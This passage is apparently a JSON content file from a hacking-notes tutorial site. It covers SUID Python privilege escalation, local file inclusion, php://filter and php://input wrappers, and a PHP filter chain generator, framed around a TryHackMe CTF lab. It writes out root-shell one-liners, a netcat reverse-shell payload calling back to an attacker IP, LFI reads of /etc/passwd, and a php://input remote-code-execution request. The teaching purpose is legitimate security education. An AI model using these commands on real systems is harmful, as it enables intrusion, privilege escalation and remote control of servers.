        "code": "/usr/bin/python2.7 -c 'import os; os.execl('/bin/sh','sh')'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Now we will run this command as it will execute that import os as root because we are using suid binary file, it will only work if UID and EUID is same if they are not same it will drop privileges."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "/usr/bin/python2.7 -c 'import os; print(os.getuid(), os.geteuid())'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "This will print UID and EUID if they are not same so ofc when you call suid file it will drop privileges, it will show something like this (33, 0)."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system('/bin/bash')'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Here we changed our UID to 0, btw 0 UID is of root, so now when it will check UID is 0 and EUID is 0 then it will give us a root shell."
      }
    ]
  },
  {
    "id": 4,
    "slug": "lfi",
    "title": "LFI - Local File Inclusion",
    "category": "notes",
    "blocksFile": "./blocks/lfi.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is LFI?"
      },
      {
        "type": "paragraph",
        "id": "lfi-definition",
        "text": "LFI stands for <highlight>Local File Inclusion</highlight>. It is a vulnerability that allows an attacker to include and read files from the local server through a vulnerable parameter."
      },
      {
        "type": "paragraph",
        "id": "lfi-definition",
        "text": "When exploiting LFI, the file is accessed by the web server process, typically running as <highlight>www-data</highlight>. This means you can only read files that the web server user (<highlight>www-data</highlight>) has permission to access."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "How to Get Files Using LFI?"
      },
      {
        "type": "explanation",
        "id": "lfi-conditions",
        "title": "Conditions Required for LFI",
        "items": [
          "The application must use a parameter to load or include a file.",
          "The parameter must not properly sanitize or validate user input.",
          "The web server must have permission to read the targeted file."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-1",
        "text": "Now let's attempt to read a file using LFI. Below is the URL that allows us to access a file on the server."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://VictimIP/secret-script.php?file=../../../../etc/passwd"
      },
      {
        "type": "explanation",
        "id": "pgp-definition",
        "title": "Breaking Down the URL",
        "items": [
          "The vulnerable file here is <highlight>secret-script.php</highlight>.",
          "This file accepts a parameter that is used to include other files.",
          "Because it does not properly validate input, we can exploit it to read files that the <highlight>web server</highlight> has access to."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-2",
        "text": "If the exploit is successful, you will receive output similar to the following. You may also try reading <highlight>/etc/hosts</highlight> if the web server has permission to access it."
      },
      {
        "type": "output_block",
        "id": "checking-command",
        "language": "bash",
        "code": "root:x:0:0:root:/root:/bin/bash ..."
      },
      {
        "type": "order_block",
        "id": "lfi-step-3",
        "text": "Now we will try to read the source code of the same file instead of executing it."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "curl -s 'http://10.10.184.98/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d"
      },
      {
        "type": "explanation",
        "id": "pgp-definition",
        "title": "Breaking Down the Command",
        "items": [
          "We use the <highlight>php://filter</highlight> wrapper to encode the file in <highlight>base64</highlight>.",
          "We cannot retrieve the raw PHP source directly because it would execute on the server instead of being displayed.",
          "After retrieving the base64-encoded content, we decode it locally to view the actual source code safely."
        ]
      },
      {
        "type": "order_block",
        "id": "initial-access",
        "text": "Let's examine the retrieved source code."
      },
      {
        "type": "output_block",
        "id": "checking-command",
        "language": "bash",
        "code": "<?php\n  //echo \"Hello World\";\n  if(isset($_GET['file'])) {\n    $file = $_GET['file'];\n    include($file);\n  }\n?>"
      },
      {
        "type": "explanation",
        "id": "pgp-definition",
        "title": "Analyzing the Source Code",
        "items": [
          "The script checks for the parameter using <highlight>if(isset($_GET['file']))</highlight>.",
          "There is no input validation or sanitization applied to the user-controlled parameter.",
          "The function <highlight>include($file);</highlight> directly includes the user-supplied value, which makes this highly vulnerable to LFI."
        ]
      },
      {
        "type": "order_block",
        "id": "initial-access",
        "text": "Basic LFI is done here, if you really want to learn about how can we use filter wrapper then take a look at <highlight>Filter chain generator</highlight> which is using filter wrapper."
      }
    ]
  },
  {
    "id": 5,
    "slug": "filter-chain-generator",
    "title": "Filter Chain Generator",
    "category": "notes",
    "blocksFile": "./blocks/filter-chain-generator.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "prerequisites": [
      {
        "title": "Basic LFI",
        "slug": "lfi"
      }
    ],
    "courseMaterials": [
      {
        "title": "TryHackMe - Cheese CTF",
        "url": "https://tryhackme.com/room/cheesectfv10"
      },
      {
        "title": "Filter Chain Generator - Github Repo",
        "url": "https://github.com/synacktiv/php_filter_chain_generator"
      }
    ],
    "blocks": [
      {
        "type": "order_block",
        "id": "lfi-step-1",
        "text": "P.S: Before continuing, make sure you understand <highlight>LFI</highlight>. You can find related learning resources in the <highlight>Course Material</highlight> section."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is a Filter Chain Generator?"
      },
      {
        "type": "explanation",
        "id": "lfi-tip",
        "title": "Purpose of the Filter Chain Generator",
        "items": [
          "The Filter Chain Generator is used to encode a PHP script so that it does not execute immediately when sent to the target machine.",
          "It uses PHP stream <highlight>wrapper</highlight> techniques internally.",
          "For the <highlight>Filter Chain Generator</highlight> to work, ensure that <highlight>LFI</highlight> is working on the target machine."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-2",
        "text": "Let's look at the command used to execute the Filter Chain Generator."
      },
      {
        "type": "code_block",
        "id": "example-1",
        "code": "python3 php_filter_chain_generator.py --chain '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f\"); ?>' | grep '^php' > payload.txt"
      },
      {
        "type": "explanation",
        "id": "lfi-tip-2",
        "title": "Understanding the Command",
        "items": [
          "It uses the <highlight>php_filter_chain_generator.py</highlight> script.",
          "<highlight>--chain</highlight> tells the tool to encode everything that comes after it.",
          "The PHP code provided is a one-line reverse shell that opens a connection back to the attacker.",
          "<highlight>grep '^php'</highlight> filters the output and keeps only the line that starts with <highlight>php</highlight>.",
          "Finally, the clean encoded payload is saved into the <highlight>payload.txt</highlight> file."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-3",
        "text": "After this, we will send the encoded string using LFI."
      },
      {
        "type": "code_block",
        "id": "example-2",
        "code": "curl -s 'http://10.10.184.98/secret-script.php?file=$(cat payload.txt)'"
      },
      {
        "type": "explanation",
        "id": "lfi-tip-3",
        "title": "How This Works",
        "items": [
          "This request sends the encoded payload to the target machine through the vulnerable LFI parameter.",
          "The <highlight>payload.txt</highlight> file contains a PHP filter chain, not just raw PHP code.",
          "PHP will decode the chain step by step until the original PHP code is reconstructed and executed."
        ]
      }
    ]
  },
  {
    "id": 6,
    "slug": "filter",
    "title": "Filter - LFI",
    "category": "notes",
    "blocksFile": "./blocks/filter.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "prerequisites": [
      {
        "title": "Basic LFI",
        "slug": "lfi"
      }
    ],
    "courseMaterials": [
      {
        "title": "TryHackMe - Cheese CTF",
        "url": "https://tryhackme.com/room/cheesectfv10"
      },
      {
        "title": "Filter Chain Generator - Github Repo",
        "url": "https://github.com/synacktiv/php_filter_chain_generator"
      }
    ],
    "blocks": [
      {
        "type": "section_heading",
        "id": "filter-lfi",
        "text": "Filter - LFI"
      },
      {
        "type": "explanation",
        "id": "lfi-filter-intro",
        "title": "php://filter",
        "items": [
          "It allows you to apply filters before PHP reads or writes a file.",
          "In short, you are telling PHP: <highlight>Before processing this file, modify its content.</highlight>"
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-1",
        "text": "Let's look at a basic example."
      },
      {
        "type": "code_block",
        "id": "example-base64",
        "code": "http://TargetIP/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php"
      },
      {
        "type": "explanation",
        "id": "lfi-filter-understanding",
        "title": "Understanding the Command",
        "items": [
          "Here we used <highlight>convert.base64-encode</highlight> to encode the file so that PHP does not execute the code.",
          "The server returns the content in <highlight>base64</highlight> format, which we can decode locally to read the source code."
        ]
      },
      {
        "type": "section_heading",
        "id": "filter-read-lfi",
        "text": "Filter + read - LFI"
      },
      {
        "type": "explanation",
        "id": "lfi-read-intro",
        "title": "What is read?",
        "items": [
          "<highlight>read=</highlight> tells PHP to apply filters when the file is being read.",
          "If only one filter is used, PHP assumes read mode automatically, so writing <highlight>read=</highlight> is optional.",
          "When chaining multiple filters, <highlight>read=</highlight> must be explicitly defined."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-2",
        "text": "Now let's look at a chained read filter."
      },
      {
        "type": "code_block",
        "id": "example-read-chain",
        "code": "http://TargetIP/secret-script.php?file=php://filter/read=convert.base64-encode|string.rot13/resource=secret-script.php"
      },
      {
        "type": "explanation",
        "id": "lfi-read-understanding",
        "title": "Understanding the Chained Filters",
        "items": [
          "This command first <highlight>encodes</highlight> the file using base64.",
          "Then it applies <highlight>string.rot13</highlight> to rotate the encoded string.",
          "Multiple filters can be combined using the <highlight>|</highlight> symbol.",
          "Filters are applied from left to right."
        ]
      },
      {
        "type": "section_heading",
        "id": "filter-write-lfi",
        "text": "Filter + write - LFI"
      },
      {
        "type": "explanation",
        "id": "lfi-write-intro",
        "title": "What is write?",
        "items": [
          "<highlight>write=</highlight> applies filters when data is being written to a file.",
          "It modifies the data before it is saved.",
          "This only works if the application uses file-writing functions such as <highlight>file_put_contents()</highlight> or <highlight>fwrite()</highlight>.",
          "In a normal LFI using include(), <highlight>write=</highlight> does not work because include() only reads files."
        ]
      },
      {
        "type": "code_block",
        "id": "example-write-filter",
        "code": "php://filter/write=convert.base64-decode/resource=shell.php"
      },
      {
        "type": "explanation",
        "id": "lfi-write-understanding",
        "title": "Understanding the Command",
        "items": [
          "For this to work, the application must write user-controlled data into the file.",
          "You must supply base64-encoded content (for example in a POST body).",
          "The write filter will decode the data first, then save the decoded result into <highlight>shell.php</highlight>.",
          "If there is no file-writing function in the application, this technique will not work."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-summary",
        "text": "So far we have covered the two main modes supported by php://filter: read and write."
      }
    ]
  },
  {
    "id": 6,
    "slug": "filter-input",
    "title": "Filter Input - LFI",
    "category": "notes",
    "blocksFile": "./blocks/lfi-input-wrapper.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "prerequisites": [
      {
        "title": "Basic LFI",
        "slug": "lfi"
      }
    ],
    "courseMaterials": [
      {
        "title": "TryHackMe - Cheese CTF",
        "url": "https://tryhackme.com/room/cheesectfv10"
      }
    ],
    "blocks": [
      {
        "id": "download-lfi-lab",
        "type": "download",
        "title": "LFI Practice Lab",
        "text": "Download the vulnerable PHP lab and payload collection.",
        "fileName": "lfi-input-lab.zip",
        "url": "/downloads/lfi-input-lab.zip",
        "size": "4kb"
      },
      {
        "type": "section_heading",
        "id": "filter-lfi",
        "text": "Filter Input - LFI"
      },
      {
        "type": "explanation",
        "id": "lfi-filter-intro",
        "title": "php://input",
        "items": [
          "It is just a <highlight>PHP stream wrapper</highlight>",
          "It contains the <highlight>raw HTTP request body</highlight>"
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-1",
        "text": "Let's look at a basic example."
      },
      {
        "type": "code_block",
        "id": "example-rce-request",
        "code": "curl -X POST \"http://127.0.0.1:4000/secret-script.php?file=php://input\" -H \"Content-Type: text/plain\" --data '<?php echo \"RCE_WORKING\\n\"; system(\"id\"); ?>'"
      },
      {
        "type": "explanation",
        "id": "lfi-filter-understanding",
        "title": "Understanding the Command",
        "items": [
          "Here we used <highlight>php://input</highlight> which serves the raw request body.",
          "It must be a <highlight>POST</highlight> request.",
          "The vulnerable file must use <highlight>include()</highlight> or <highlight>require()</highlight> on user-controlled input.",
          "Content-Type should be <highlight>text/plain</highlight> to avoid PHP consuming the body as form data.",
          "The PHP code inside --data will only execute if <highlight>include()</highlight> processes php://input and <highlight>allow_url_include</highlight> is enabled."
        ]
      },
      {
        "type": "order_block",
        "id": "lfi-step-2",
        "text": "Now let's look at the output of the above command."
      },
      {
        "type": "output_block",
        "id": "example-rce-output",
        "code": "RCE_WORKING uid=1000(azid) gid=1000(azid) groups=1000(azid),4(adm),20(dialout)..."
      },
      {
        "type": "order_block",
        "id": "lfi-step-3",
        "text": "Sometimes PHP stream wrappers are disabled. You need to check the configuration."
      },
      {
        "type": "code_block",
        "id": "check-allow-url-include",
        "code": "php -i | grep allow_url_include"
      },
      {
        "type": "order_block",
        "id": "lfi-step-4",
        "text": "If the result shows Off, then wrapper-based RCE will not work. On real targets you cannot change this setting. On a local lab machine you can modify it for learning purposes."
      },
      {
        "type": "code_block",
        "id": "edit-php-ini",
        "code": "sudo nano /etc/php/*/cli/php.ini"
      },
      {
        "type": "order_block",
        "id": "lfi-step-5",
        "text": "Change <highlight>allow_url_include = Off</highlight> to <highlight>allow_url_include = On</highlight> and restart the PHP server."
      }
    ]
  },
  {
    "id": 6,
    "slug": "all-filters",
    "title": "All Filters - LFI",
    "category": "notes",
    "blocksFile": "./blocks/all-filters.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "prerequisites": [
      {
        "title": "Basic LFI",
        "slug": "lfi"
      }
    ],
    "blocks": [
      {
        "id": "download-lfi-lab",
        "type": "download",
        "title": "LFI Practice Lab",
        "text": "Download the vulnerable PHP lab and payload collection.",
        "fileName": "lfi-input-lab.zip",
        "url": "/downloads/lfi-input-lab.zip",
        "size": "4kb"
      },
      {
        "type": "order_block",
        "id": "lfi-step-1",
        "text": "We will examine each stream filter one by one."
      },
      {
        "type": "section_heading",
        "id": "encoding-filters",
        "text": "Encoding Filters"
      },
      {
        "type": "code_block",
        "id": "base64-encode-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-encode/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "base64-encode-explain",
        "text": "Encodes file content into Base64 format and prevents PHP execution."
      },
      {
        "type": "code_block",
        "id": "base64-decode-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-decode/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "base64-decode-explain",
        "text": "Decodes Base64 encoded content back into original form."
      },
      {
        "type": "code_block",
        "id": "base64-chain-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.base64-encode|convert.base64-decode/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "base64-chain-explain",
        "text": "Encodes and then decodes the content. Final result behaves like direct file inclusion."
      },
      {
        "type": "code_block",
        "id": "quoted-printable-encode-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.quoted-printable-encode/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "quoted-printable-encode-explain",
        "text": "Encodes special characters into quoted-printable format (example: < becomes =3C)."
      },
      {
        "type": "code_block",
        "id": "quoted-printable-decode-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.quoted-printable-decode/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "quoted-printable-decode-explain",
        "text": "Decodes quoted-printable encoded content back to normal text."
      },
      {
        "type": "code_block",
        "id": "iconv-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "iconv-explain",
        "text": "Converts character encoding from UTF-8 to UTF-16, modifying underlying byte structure."
      },
      {
        "type": "section_heading",
        "id": "compression-filters",
        "text": "Compression Filters"
      },
      {
        "type": "code_block",
        "id": "zlib-deflate-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=zlib.deflate/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "zlib-deflate-explain",
        "text": "Compresses the file content using zlib compression."
      },
      {
        "type": "code_block",
        "id": "zlib-inflate-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=zlib.inflate/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "zlib-inflate-explain",
        "text": "Decompresses previously compressed zlib content."
      },
      {
        "type": "section_heading",
        "id": "string-filters",
        "text": "String Filters"
      },
      {
        "type": "code_block",
        "id": "rot13-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.rot13/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "rot13-explain",
        "text": "Applies ROT13 substitution cipher to alphabetic characters."
      },
      {
        "type": "code_block",
        "id": "toupper-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.toupper/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "toupper-explain",
        "text": "Converts alphabetic characters to uppercase."
      },
      {
        "type": "code_block",
        "id": "tolower-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=string.tolower/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "tolower-explain",
        "text": "Converts alphabetic characters to lowercase."
      },
      {
        "type": "section_heading",
        "id": "other-filters",
        "text": "Other Filters"
      },
      {
        "type": "code_block",
        "id": "dechunk-example",
        "code": "curl \"http://127.0.0.1:4000/secret-script.php?file=php://filter/read=dechunk/resource=secret-script.php\""
      },
      {
        "type": "order_block",
        "id": "dechunk-explain",
        "text": "Removes HTTP chunked transfer encoding from content."
      }
    ]
  }
]